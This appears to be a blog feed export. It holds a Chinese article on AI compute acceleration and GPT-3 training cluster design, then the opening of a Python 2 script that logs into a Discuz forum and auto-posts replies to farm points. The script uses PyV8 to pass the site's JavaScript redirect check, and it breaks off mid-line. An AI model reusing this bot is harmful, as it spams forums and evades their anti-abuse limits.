<p>对于企业是这样子，对于国家也是如此。计算力之于智慧时代就像是电力之于电气时代，都是生产力的重要形式。</p>
<p>那么，我们便可以通过计算力的情况，来分析一个国家的经济发展情况，就如同克强指数里面的电力能够衡量一个行业的发展情况类似。据统计，国家GDP的数字与服务器的出货量，GDP与服务器采购额呈现出明显的正线性相关关系。</p>
<p>美国、中两国不仅GDP远远领先于日本和德国，每万亿GDP的服务器数量也远远高于他们，数字经济的贡献占比明显高于他们。</p>
<p>我们国内各个省得情况，与此完全类似，北、上、广、浙每万亿GDP的服务器出货量远大于其他省区，因此他们新旧动能转换的就快，发展质量就跑在了前面。所以我们可以说计算力已经成为衡量社会和经济发展水平的重要指标。</p>
<p>面对指数级增长的计算需求，计算技术、产品与产业也面临着新的挑战。具体来说，体现在以下三个方面，一个是多元化的挑战，也就是计算场景的复杂、计算架构的多元；一个是巨量化的挑战，也就是由巨量模型、巨量数据、巨量算力及巨量应用引发的对现有计算机体系结构的挑战；</p>
<p>最后一个则是生态化的挑战，简单来说现在的智算处于群雄并起阶段，自成体系、生态离散，同时产业链上下游脱节。</p>
<p>第一个挑战是多元化。</p>
<p>我们讲计算最关键的任务就是支撑业务，那么不同的业务类型，势必要求有不同的计算系统来完成。例如针对传统的地震波模拟等科学计算，数值精度要求高，需要能到64位；而AI训练，则可以使用数值范围大、精度低的16位浮点类型；对于AI推理，由于推理要求速度、耗能少，则可以在更低的数值精度下进行处理，如4位、甚至2位、1位整数类型。</p>
<p>也就是说AI的应用引入了新计算类型，从推理到训练，跨度更大，同时，数据量也从GB级到TB级、PB级不断提升，类型从结构化到半结构化、非结构化更加复杂多样。</p>
<p>不同数值精度的计算类型对于计算芯片指令集、架构的要求是不一样的，这样就导致之前我们一直使用的通用CPU芯片已经无法满足这种多元化计算场景要求了，这也是计算芯片的种类越来越多的很重要的原因。</p>
<p>第二个挑战是巨量化。巨量化首先表现在模型参数多、训练数据量大。<br>以自然语言处理为例，基于自监督学习的预训练模型兴起后，模型精度随着模型尺寸及训练数据的增加而显著提升。</p>
<p>20年GPT-3模型的参数量首次突破千亿大关，达到了1750亿。按照当前的发展趋势，23年模型的参数量将突破百万亿，也就是基本达到人脑神经突触数量，人脑的神经突触数量约125万亿。</p>
<p>巨量模型需要巨量内存。当前一颗GPU的板载高速内存容量为40GB，对于包含百万亿参数的巨量模型，仅是将这些参数平均分配到每个GPU内存中，就需要1万块GPU才能装得下。</p>
<p>考虑到训练中需要额外的存储，实际上至少需要2万块GPU才能启动训练。现有AI芯片的架构已经不足以支撑巨量模型的参数存储需求。</p>
<p>同时，巨量模型依赖海量数据的喂养，目前的AI算法本质上还是一种依赖量变的质变，很难从一种质变跳跃到另一种质变，例如最新的巨量模型需要万亿级的词量数据。海量数据需要海量存储。在超大规模集群中同时满足几万块AI芯片的高性能读取，对存储系统是个极大的挑战。</p>
<p>巨量化的第二个表现是计算力需求指数增长</p>
<p>深度学习自2011年兴起至今，对算力的需求始终呈指数增长。每隔3.4个月，算力需求翻一倍。Petaflops*day代表以1P每秒的算力计算一天所用浮点计算量来度量算力。训练巨量模型需要巨大算力：20年GPT-3的算力达到了3640PD，到23年巨量模型的算力需求将达到百万PD。</p>
<p>在当今世界最快的超算系统上，完成百万PD的计算所需时间约为2年。不同领域需要不同类型的巨量模型：GPT-3以处理英文理解任务为主，为了满足不同语言，不同场景的精度要求，也要训练不同的巨量模型，这进一步加剧了对算力的需求。</p>
<p>如此庞大的算力需求给计算技术和产品带来了巨大挑战。解决这样的挑战需要从体系结构、系统软件等各个领域开展创新。</p>
<p>最后我们来看一下智算面临的生态化的挑战，AI的技术链条、产业链条是脱节的。我想很多人会有这样的疑问，人工智能那么好，但是这东西怎么跟我的业务，跟我的客户应用场景结合起来呢，我想用AI技术做智能化转型，但是发现我这里没人懂算法，懂模型，也缺少好用的AI开发平台。同时，那么多算法，模型，如何找到不同算法在应用中的最优组合。</p>
<p>懂这些的人，往往都集中在科研机构或者头部公司。这些地方集中了最优秀的AI人才，但缺少对传统行业的需求场景、业务规律的深入理解，也拿不到最关键的业务数据去对模型进行训练，导致技术无用武之地。</p>
<p>埃森哲等咨询机构的调查报告也表明，70%以上的有技术的研究机构、科技公司缺需求场景、缺领域知识和数据，70%以上的行业用户缺技术人才、缺AI平台和实践能力。</p>
<h1 id="2-AI加速技术介绍"><a href="#2-AI加速技术介绍" class="headerlink" title="2 AI加速技术介绍"></a>2 AI加速技术介绍</h1><h2 id="2-1-AI架构"><a href="#2-1-AI架构" class="headerlink" title="2.1 AI架构"></a>2.1 AI架构</h2><p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/3.png" alt="avatar"></p>
<p>通常用户对接触到的AI架构相关的信息是申请XX核CPU， XX张CPU卡，XXGB内存等资源，其对应AI架构的计算资源、存储资源和网络资源，实际的AI架构包括计算节点、管理节点、存储节点、计算网络、管理网络和客户端等。</p>
<p>如何进行计算资源的规划呢？秉持的原则是花最低的成本满足需求，同时考虑到扩展性，比如有两种以上计算特征的业务，而且规模都不小，那么对应的计算节点类型也应有两种以上；如果极限需求规模远大于其它需求，那么可以减少计算节点类型数量，以便将来不断扩展。</p>
<h2 id="2-2-AI加速技术"><a href="#2-2-AI加速技术" class="headerlink" title="2.2 AI加速技术"></a>2.2 AI加速技术</h2><p>AI对计算的需求非常大，如何加速直接关系到生产效率和成本，下面介绍一下当前最新的一些AI加速技术。</p>
<h3 id="2-2-1-计算"><a href="#2-2-1-计算" class="headerlink" title="2.2.1 计算"></a>2.2.1 计算</h3><p>（1）异构计算</p>
<p>在GPU用于AI计算前，都是CPU承担计算任务，但是随着AI计算需求的急剧增加，CPU的计算效率难以满足需求，产生了“CPU+GPU”的异构计算架构，如下图右上角所示。</p>
<p>如下图右下角所示，GPU的计算效率是CPU的几倍~几十倍，为什么CPU和GPU的计算效率会有这么大的差异呢？主要是CPU和GPU的架构存在巨大差异，如下图左下角所示，GPU的计算单元数量远远多于CPU的计算单元，所以GPU更适合于大规模并行计算。</p>
<p>而CPU架构中Control和Cache单元面积则比GPU大得多，所以CPU更适用于不能高度并行的复杂计算（比如代码中的if语句等）。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/4.png" alt="avatar"></p>
<p>（2）NVLINK通信</p>
<p>随着AI计算规模增大，例如大规模AI训练，需要多卡甚至多个节点同时参与一个任务的计算，其中一个关键点就是如何支持节点内GPU间的高速通信，以便他们可以作为一个巨大的加速器相互协作。</p>
<p>虽然PCIe非常标准，但是带宽非常有限，如下图左上角所示，PCIe Gen3的理论带宽是32GB/s，PCIe Gen4的理论带宽是64GB/s，而实测带宽大概分别是24GB/s和48GB/s。</p>
<p>在AI训练中，没完成一轮计算，都要同步更新一次参数，也就是权系数，模型规模越大，参数规模一般也会更大，这样GPU之间通信（P2P）能力对计算效率影响就比较大，如下图右上角所示，同样是8卡V100， NVLINK2.0架构相比PCIe架构性能提升26%，NVLINK2.0 Next架构（全互联，任意两张卡间P2P通信带宽都是300GB/s）则相比PCIe架构提升67%。</p>
<p>NVLINK是NVIDIA开发的一项高速GPU互联技术，现在已经发展到第三代（NVLINK3.0），如下图下半部分，从NVLINK1.0（P100）到NVLINK2.0（V100），再到NVLINK3.0（A100），带宽从160GB/s到300GB/s，再到600GB/s，NVLINK1.0和2.0的P2P通信不是全互联，也就是，任意两张GPU卡之间的通信带宽实际没有达到最大带宽，有的甚至还通过PCIe通信，这样节点内GPU P2P通信就产生了台阶。</p>
<p>而NVLINK3.0则实现了P2P全互联通信，任意两张卡之间的通信带宽是600GB/s，极大的提升了节点内多卡计算效率。<br><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/5.png" alt="avatar"></p>
<p>（3）Tensor Core<br>V100的张量核心是可编程的矩阵乘法和累加单元，可以提供多达125 Tensor TFLOPS的训练和推理应用。V100包含640个Tensor Cores。每个张量核提供一个4x4x4矩阵处理数组，它执行操作D=a*B+C，其中a、B、C和D是4×4矩阵，如下图上部所示。矩阵乘法输入A和B是FP16矩阵，而累积矩阵C和D可以是FP16或FP32矩阵。</p>
<p>每个 Tensor 核心每个时钟周期可执行 64 次浮点混合乘加 (FMA) 运算。从而为训练和推理应用程序提供高达 125 TFLOPS 的计算性能。这意味着开发人员可以使用混合精度（FP16 计算使用 FP32 累加）执行深度学习训练，从而实现比上一代产品快 3 倍的性能，并可收敛至网络预期准确度。</p>
<p>Tensor内核提供的GEMM性能是以前硬件的几倍，如下图右下角所示，GP100（Pascal）和GV100（Volta）硬件的比较性能。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/6.png" alt="avatar"></p>
<p>（4）多元算力<br>随着AI的发展，产生了各类芯片，比如CPU、GPU、ASIC、FPGA，如下图上部所示，从通用性和性能两个维度去分析比较，通用性维度：CPU &gt; GPU &gt; FPGA &gt; ASIC，性能维度则是正好相反。不同的AI任务，对芯片的要求不同，比如训练任务，需要能支持各类框架、模型、算法库等，需要很高的通用性，NVIDIA GPU因为其完备的生态，具有很高的通用性，从而占据主导地位。</p>
<p>而对于推理任务，则仅需支持某一或某几个框架、模型、算法库等，因为靠近业务，所以对性能和成本的需求更多，于是ASIC芯片则在部分场景的性价比超过NVIDIA GPU，从下图下半所示的IDC统计的各类芯片市场销量可以看出来，在推理市场，NVIDIA GPU虽然仍然占据主导，但是其它芯片的依然能跟上NVIDIA GPU的步伐，训练市场，其它芯片依然进展缓慢。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/7.png" alt="avatar"></p>
<p>（5）低精度<br>如果能将32位的浮点数压缩到16位，虽然会损失一定的表示精度，但无论在参数的存储空间上还是在计算量（FPU计算次数）上都会带来极大的改进。</p>
<p>这就是混合精度训练的基本原理。权重的主版本是以FP32形式存储的，在做推理与反向传播运算时先换成FP16在做计算，在做权重更新时，更新的增量（梯度乘以学习率）也是加到以FP32表示的权重上的，如下图上部所示。</p>
<p>如下图所示，在某些场景，低精度不仅带来性能的提，还可以在推理任务重用来处理更复杂的模型，从而提高推理任务的精度。<br><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/8.png" alt="avatar"></p>
<h3 id="2-2-2-网络"><a href="#2-2-2-网络" class="headerlink" title="2.2.2 网络"></a>2.2.2 网络</h3><p>（1）GDR<br>GDR（GPU Direct RDMA），就是计算机1的GPU可以直接访问计算机2的GPU内存，如下图上半部所以。了解GDR概念之前，首先了解DMA和RDMA概念。</p>
<p>DMA（Direct Memory Access）直接内存访问，是Offload CPU负载的一项重要技术。DMA的引入，使得原来设备内存与系统内存的数据交换必须要CPU参与，变为交给DMA控制来进行数据传输，是一种完全由硬件执行I/O交换的工作方式。<br>RDMA可以简单理解为利用相关的硬件和网络技术，服务器1的网卡可以直接读写服务器2的内存，最终达到高带宽、低延迟和低资源利用率的效果。</p>
<p>目前RDMA的实现方式主要分为InfiniBand和Ethernet两种传输网络。而在以太网上，又可以根据与以太网融合的协议栈的差异分为IWARP和RoCE（包括RoCEv1和RoCEv2）。</p>
<p>所谓GPUDirect RDMA，就是计算机1的GPU可以直接访问计算机2的GPU内存。而在没有这项技术之前，GPU需要先将数据从GPU内存搬移到系统内存，然后再利用RDMA传输到计算机2，计算机2的GPU还要做一次数据从系统内存到GPU内存的搬移动作。</p>
<p>GPUDirect RDMA技术使得进一步减少了GPU通信的数据复制次数，通信延迟进一步降低。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/9.png" alt="avatar"></p>
<p>（2）SHARP<br>SHARP（Scalable Hierarchical Aggregation and Reduction Protocol）是一种集合通信网络卸载技术。</p>
<p>在AI训练中，常常有很多集合类通信，这些集合类通信由于涉及全局，常常对应用程序并行效率产生巨大的影响。</p>
<p>针对这种情况，NVIDIA Mellanox从EDR InfiniBand交换机开始引入了SHARP技术，在交换机芯片中集成了计算引擎单元，可以支持16位、32位及64位定点计算或浮点计算，可以支持求和，求最小值，求最大值，求与，求或及异或等计算，可以支持Barrier、Reduce、All-Reduce等操作。</p>
<p>在多交换机组成的机群环境下，Mellanox定义了一整套的可扩展分层次聚合和归约协议（SHARP）卸载机制，由聚合管理器(Aggregation Manager)在物理拓扑中构造一个逻辑的SHARP树，由SHARP树中的多个交换机并行分布式处理集合类通信操作。</p>
<p>当主机需要进行全局通信例如allreduce时，所有主机把通信数据提交到各自连接的交换机，第一级交换机收到数据后，会使用内置的引擎对数据进行计算和处理，然后把结果数据提交到SHARP树的上一级交换机，上一级交换机也使用自己的引擎对从若干个交换机收上来结果数据做聚合处理，并继续向SHARP树的上一级递交。</p>
<p>到达SHARP树的根交换机后，根交换机做最后计算并把结果回发给所有的主机节点。通过SHARP方式，可以大幅降低集合通信的延迟，减少网络拥塞，并提升机群系统的可扩展性（如下图上半部所示）。<br>SHARP对于复杂模型，复杂多层网络效果更加显著，如下图下半部所示，随着集群规模的增大，开启SHARP功能后，延迟基本没变化，相比未启用SHARP功能，延迟呈线性增长；同样对于最终的性能提升也是差异比较大。<br><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/10.png" alt="avatar"></p>
<p>（3）IB（INFINIBAND）<br>InfiniBand Architecture是为大规模数据中心设计的软件定义网络架构，它的设计旨在实现最高效的数据中心互连基础设施。InfiniBand原生地支持SDN、Overlay和虚拟化等网络技术，是一种开放标准的高带宽、低时延、高可靠的网络互连。相比RoCE网络，IB有诸多优势，如下图上半部分。</p>
<p>当然关于AI训练网络是选用IB还是RoCE，在近期的套餐升级方案中争论的比较激烈，NVIDIA是主推IB的，他们的论据是除了列出各种功能优势外，还有近两年互联网企业，如阿里、百度、京东、腾讯等部署的AI集群大都采用IB网络，然而也拿不出非常让人信服的量化数据，从阿里的维度看，由于有一支专门的RoCE网络优化团队，所以获得了近似IB的性能，同时NVIDIA所列的SHARP等Benchmark性能在实际用户中仅取得3%-5%左右的性能提升（现在估计是在大模型、三层及以上网络架构效果显著些）。</p>
<p>总的来说，目前阶段的结论是IB是优于RoCE，IB把优化工作做到生态（NCCL/CUDA/…）中，对用户来说，优化工作量非常小，但是对于RoCE，需要有专门的团队，较深的优化积累，相比较而言，当前选择IB更适合，当然成本有所提升，但如下图下半部分，带来的性能提升量更大。</p>
<p>当然，在云化的大背景下，除了以太，又多了一套网络架构，对于整体运维和管理带来复杂度提升，所以，IB&amp;RoCE之争不妨可以再深入分析，列举更多的量化数据，做更多的原理性分析，从而达到对网络的深度认知。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/11.png" alt="avatar"></p>
<p>（4）多网卡<br>前面讲到NVLINK3.0的通信带宽为600GB/s，PCIe4.0的实测通信带宽也达到了48GB/s，而当前的计算网络通常最大是100Gb/s（12.5GB/s），所以对于需要跨节点多机多卡计算的大模型训练任务时，节点间参数通信就会遇到瓶颈，这时有必要采用多网卡策略，也就是两个节点间不再是连接1根网线，而是多根，从下图可以看出多网卡对于性能的提升量明显，由于网络成本占整个计算系统成本一般为10%左右，所以10%以上的性能提升对于整个计算系统来说，性价比是提升的。<br><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/12.png" alt="avatar"></p>
<h3 id="2-2-3-存储"><a href="#2-2-3-存储" class="headerlink" title="2.2.3 存储"></a>2.2.3 存储</h3><p>（1）GDS<br>GDS（GPUDirect Storage），是NVIDIA推出的又一GPUDirect技术，由于GPU计算速度很快，但是随着数据集和模型规模不断增加，应用程序载入数据花费的时间越来越长，进而影响了应用程序的性能，而且特别是端到端架构，会因为缓慢的I/O使得运算速度日益提升的GPU无用武之地。</p>
<p>数据从NVMe磁盘传输到GPU內存的标准路径，是使用系统內存中的回弹缓存（Bounce Buffer）也就是额外的数据拷贝。而GPUDirect存储技术避免使用回弹缓存，以减少额外的数据副本，并使用直接內存存取引擎（Direct Memory Access，DMA）将数据直接放到GPU內存中，为远端或是本地存储。</p>
<p>诸如NVMe或NVMe over Fabric，和GPU內存之间，建立一个直接传输数据的路径，而这能有效减轻CPU I/O的瓶颈，提升I/O带宽和传输数据的量。</p>
<p>英伟达发展GPUDirect存储技术，大幅提升GPU载入大型数据集的速度。英伟达提到，GPUDirect存储技术的主要功能，就是通过这个新的系统，以直接內存的存取方式，将数据传输至GPU内存上。</p>
<p>当然，发展到现在GDR落地场景还不是很多，首先是文件系统需要做适配，只有通过NVIDIA认证了才能支持GDR技术，限制了技术的推广；其次，GDR主要还是单机内的技术，而且NVME主要是用来承载内存空间不足，统一存储带宽又偏低的一个中间状态需求，适用的场景较窄，所以业内适配的积极性也不高，但不管怎么说，GDR也为AI架构又提供了一种加速选择。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/13.png" alt="avatar"></p>
<p>（2）Burst Buffer<br>Burst Buffer技术能够利用计算节点本地SSD硬盘，组成临时高速缓存文件系统。该功能可以通过更快的checkpoint restart提高应用程序可靠性；加快小块传输和分析的I/O性能；为核心外部应用程序提供快速临时存储空间；为需要计算过程中持久快速存储的大量文件输入计算任务创建暂存区域。</p>
<p>之前在HPC架构中采用较多，比如世界HPC TOP500榜单排名前10的超算集群，有多套已采用Burst Buffer技术，在AI架构中，现在也有用户在尝试采用类似技术，为大规模训练提供超大高速缓存。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/14.png" alt="avatar"></p>
<p>2.2.4 并行技术<br>AI大规模训练中，非常重要的一项技术就是并行技术。在多个计算设备上部署深度学习模型是训练大规模复杂模型的一种方式，随着对训练速度和训练频率的要求越来越高，该方法的重要性不断增长。</p>
<p>数据并行化（Data parallelism，DP）是应用最为广泛的并行策略，但当一张GPU的显存不能放下一个模型时，需要堆模型进行拆分， 将模型分为N个部分，分别加载到不同的N个GPU节点中，模型拆分按照拆分方式不同，又分为张量切片模型并行(层内模型并行)、Pipeline模型并行(层间模型并行)。</p>
<p>如DeepSpeed模型，GPT-3模型等则需要采用多种并行方式组合，才能完整装下整个模型。</p>
<p>而对于GPT-3模型来说，其对计算和I/O的需求都非常大，需要综合前面讲到的主要的加速技术，比如NVLINK，Tensor Core、IB、多网卡、GDR、并行方式等，才能高效的完成大模型训练。<br><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/15.png" alt="avatar"></p>
<h2 id="2-3总结"><a href="#2-3总结" class="headerlink" title="2.3总结"></a>2.3总结</h2><p>前面讲到了各种AI加速技术，其实汇总起来无外乎都是在朝着两个方向努力：计算和I/O，采用异构计算是为了提升计算能力，采用NVLINK、IB、GDR、GDS、BurstBuffer、多网卡等都是为了提升IO带宽和延迟。</p>
<p>因为从GPU 缓存（7TB/s）到显存（1.6TB/s）、CPU内存（90GB/s）、高速缓存（24GB/s）、NVME硬盘（6GB/s）、分布式存储（5GB/s，规模大可到几十上百GB/s）、 冷存货（2GB/s），IO带宽存在台阶，所以AI架构IO加速的方向是在逐步弥补台阶的差异，当然算法上还需要尽可能的利用架构的特点，最大化的利用最快的IO架构。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/16.png" alt="avatar"></p>
<h1 id="3-GPT-3模型预训练计算架构分析"><a href="#3-GPT-3模型预训练计算架构分析" class="headerlink" title="3 GPT-3模型预训练计算架构分析"></a>3 GPT-3模型预训练计算架构分析</h1><p>下面以GPT-3模型预训练为例，进行简单的架构分析。</p>
<h2 id="3-1-GPT-3模型计算特征分析"><a href="#3-1-GPT-3模型计算特征分析" class="headerlink" title="3.1 GPT-3模型计算特征分析"></a>3.1 GPT-3模型计算特征分析</h2><p>在进行AI架构方案设计时，首先要弄清楚GPT-3的计算特征，也就是什么样的计算和I/O满足GPT-3模型预训练的极限需求。</p>
<p>一般是通过理论分析和实际测试两个维度分析，通过分析，可以获知，GPT-3的I/O需要接近100GB/s，对应的网络需要4*HDR 200网络支持，也就是需要4网卡，这次采用的是Infiniband网络。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/17.png" alt="avatar"></p>
<p>其次是计算需求，以A100的算力312TFlops来评估：GPT-2的计算需求约为 10 PetaFlop/s-day, 约等于64个A100 GPU训练1天时间；GPT-3的计算需求约为3640 PetaFlop/s-day, 约等于64个A100 GPU训练1年时间。下表是近期业内发布的几个大模型使用的训练计算资源情况。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/18.png" alt="avatar"></p>
<h2 id="3-2-GPT-3模型预训练计算架构分析"><a href="#3-2-GPT-3模型预训练计算架构分析" class="headerlink" title="3.2 GPT-3模型预训练计算架构分析"></a>3.2 GPT-3模型预训练计算架构分析</h2><p>如前一节分析，AI计算架构的计算部分采用最新的A100 GPU卡，I/O部分采用4*HDR200 IB网络，GPU之间采用NVLINK实现600GB/s高速互联。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/19.png" alt="avatar"></p>
<p>NVLINK A100 服务器拓扑</p>
<p>下图是对应的网络拓扑：</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/20.png" alt="avatar"></p>
<p>大模型训练平台架构（140节点）</p>
<h1 id="4-结语"><a href="#4-结语" class="headerlink" title="4 结语"></a>4 结语</h1><p>AI算力是人工智能三要素的重要组成部分，AI加速技术围绕计算和I/O正在飞速的发展，不断提升AI计算任务的计算效率，我们加强对于AI架构的理解。</p>
<p>当然AI加速除了配置相应的硬件架构，还需要平台、框架、算法等相关技术人员一起合作，才能最大化的利用当前最新的AI架构。</p>
<p>原文地址：<a href="https://segmentfault.com/a/1190000041485197###" target="_blank" rel="noopener">https://segmentfault.com/a/1190000041485197###</a></p>
]]></content>
  </entry>
  <entry>
    <title>Discuz 论坛评论回复代码</title>
    <url>/2020/09/21/Discuz-%E8%AE%BA%E5%9D%9B%E8%AF%84%E8%AE%BA%E5%9B%9E%E5%A4%8D%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p>         本来想着刷下积分，换点礼品，结果居然好有限制。附上代码。更新代码，增加摇一摇赚取浪花的功能。找了台服务器，摇浪花啦。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-\*-coding:utf-8-\*-</span><br><span class="line">import urllib2, urllib, cookielib</span><br><span class="line">import re</span><br><span class="line">import getpass</span><br><span class="line">import sqlite3</span><br><span class="line">import urlparse</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">import PyV8</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">class Discuz:</span><br><span class="line">    def \_\_init\_\_(self,user,pwd,args):</span><br><span class="line">        self.username &#x3D; user</span><br><span class="line">        self.password &#x3D; pwd</span><br><span class="line">        self.args &#x3D; args</span><br><span class="line">        self.regex &#x3D; &#123;</span><br><span class="line">            &#39;loginreg&#39;:&#39;&lt;input\\s\*type&#x3D;&quot;hidden&quot;\\s\*name&#x3D;&quot;formhash&quot;\\s\*value&#x3D;&quot;(\[\\w\\W\]+?)&quot;\\s\*\\&#x2F;&gt;&#39;,</span><br><span class="line">            #input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;formhash&quot; value&#x3D;&quot;7f420ac4&quot;</span><br><span class="line">            &#39;replyreg&#39;:&#39;&lt;input\\s\*type&#x3D;&quot;hidden&quot;\\s\*name&#x3D;&quot;formhash&quot;\\s\*value&#x3D;&quot;(\[\\w\\W\]+?)&quot;\\s\*\\&#x2F;&gt;&#39;,</span><br><span class="line">            &#39;tidreg&#39;: &#39;&lt;tbody\\s\*id&#x3D;&quot;normalthread\_\\d+&quot;&gt;\[\\s\\S\]+?&lt;span\\s\*id&#x3D;&quot;thread\_(\\d+)&quot;&gt;&#39;,</span><br><span class="line">            &#39;subform&#39;:&#39;&lt;a href&#x3D;&quot;forum.php\\?mod&#x3D;forumdisplay&amp;fid&#x3D;\\d+&quot;&gt;\\S+&lt;&#x2F;a&gt;&#39;,</span><br><span class="line">            &#39;topidreg&#39;:&#39;&lt;a href&#x3D;&quot;forum.php\\?mod&#x3D;viewthread&amp;tid&#x3D;\\d+&amp;extra&#x3D;page%3D1&quot; onclick&#x3D;&quot;atarget\\(this\\)&quot; class&#x3D;&quot;s xst&quot;&gt;\\S+&lt;&#x2F;a&gt;&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        self.subform&#x3D;\[&#39;OpenStack&#39;,u&#39;云服务&#39;,u&#39;云管理&#39;,&#39;hadoop&#39;,&#39;storm&#39;,&#39;spark&#39;\]</span><br><span class="line">        self.conn &#x3D; None</span><br><span class="line">        self.cur &#x3D; None</span><br><span class="line">        self.islogin &#x3D; False</span><br><span class="line">        self.login()</span><br><span class="line">        self.InitDB()</span><br><span class="line"></span><br><span class="line">    def login(self):</span><br><span class="line">        try:</span><br><span class="line">            loginPage &#x3D; urllib2.urlopen(self.args\[&#39;loginurl&#39;\]).read()</span><br><span class="line">            print &#39;start login...&#39;</span><br><span class="line">            cj &#x3D; cookielib.CookieJar()</span><br><span class="line">            opener &#x3D; urllib2.build\_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line">            user\_agent &#x3D; &#39;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; Mozilla&#x2F;4.0 \\</span><br><span class="line">                    (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.507&#39;</span><br><span class="line">            opener.addheaders &#x3D; \[(&#39;User-agent&#39;, user\_agent)\]</span><br><span class="line">            urllib2.install\_opener(opener)</span><br><span class="line">            logindata &#x3D; urllib.urlencode(&#123;</span><br><span class="line">                &#39;cookietime&#39;:    2592000,</span><br><span class="line">               # &#39;formhash&#39;: formhash,</span><br><span class="line">                &#39;loginfield&#39;:&#39;username&#39;,</span><br><span class="line">                &#39;username&#39;:    self.username,</span><br><span class="line">                &#39;password&#39;:    self.password,</span><br><span class="line">                &#39;quickforward&#39;:    &#39;yes&#39;,</span><br><span class="line">                &#39;fastloginfield&#39;:&#39;username&#39;,</span><br><span class="line">                &#39;handlekey&#39;:&#39;ls&#39;,</span><br><span class="line">                &#39;referer&#39;: self.args\[&#39;referer&#39;\]</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            request &#x3D; urllib2.Request(self.args\[&#39;loginsubmiturl&#39;\],logindata)</span><br><span class="line">            response &#x3D; urllib2.urlopen(request)</span><br><span class="line">            self.islogin &#x3D; True</span><br><span class="line">            print &#39;login success...&#39;</span><br><span class="line">        except Exception,e:</span><br><span class="line">                print &#39;loggin error: %s&#39; % e</span><br><span class="line"></span><br><span class="line">    def PostReply(self, fid, tid, topicUrl,content):</span><br><span class="line">        try:</span><br><span class="line">            if self.islogin:</span><br><span class="line">                temp&#x3D;self.args\[&#39;replysubmiturl&#39;\]</span><br><span class="line">                replysubmiturl &#x3D; temp %(fid,tid)</span><br><span class="line">                response &#x3D; urllib2.urlopen(topicUrl)</span><br><span class="line">                content11 &#x3D; response.read()</span><br><span class="line">               # print content11</span><br><span class="line">                # update url</span><br><span class="line">                url&#x3D;self.getNewUrlFromJs(content11);</span><br><span class="line">                newTopicUrl&#x3D; self.args\[&#39;redirectBaseUrl&#39;\]+url</span><br><span class="line">                response &#x3D; urllib2.urlopen(newTopicUrl)</span><br><span class="line">                content11 &#x3D; response.read()</span><br><span class="line">                formhashs &#x3D; re.search(self.regex\[&#39;replyreg&#39;\], content11)</span><br><span class="line">                formhash&#x3D; formhashs.group(1)</span><br><span class="line">                print formhash</span><br><span class="line">                replydata &#x3D; urllib.urlencode(&#123;</span><br><span class="line">                    &#39;formhash&#39;: formhash,</span><br><span class="line">                    &#39;message&#39;: content,</span><br><span class="line">                    &#39;subject&#39;: &#39;&#39;,</span><br><span class="line">                    &#39;usesig&#39;:&#39;1&#39;</span><br><span class="line">                &#125;)</span><br><span class="line">                request &#x3D; urllib2.Request(replysubmiturl,replydata)</span><br><span class="line">                response &#x3D; urllib2.urlopen(request)</span><br><span class="line">                print &#39;reply success for \[%s\]&#39; % topicUrl</span><br><span class="line">            else:</span><br><span class="line">                print &#39;user not login&#39;</span><br><span class="line">        except Exception, e:</span><br><span class="line">                print &#39;reply error: %s&#39; % e</span><br><span class="line"></span><br><span class="line">    def GetSubForms(self):</span><br><span class="line">        if self.islogin:</span><br><span class="line">            fidurl &#x3D; self.args\[&#39;fidurl&#39;\]</span><br><span class="line">            response &#x3D; urllib2.urlopen(fidurl)</span><br><span class="line">            content &#x3D; response.read()</span><br><span class="line">            soup &#x3D; BeautifulSoup(content,&quot;html.parser&quot;)</span><br><span class="line">            h1userSoupList&#x3D;soup.findAll(name&#x3D;&quot;a&quot;, 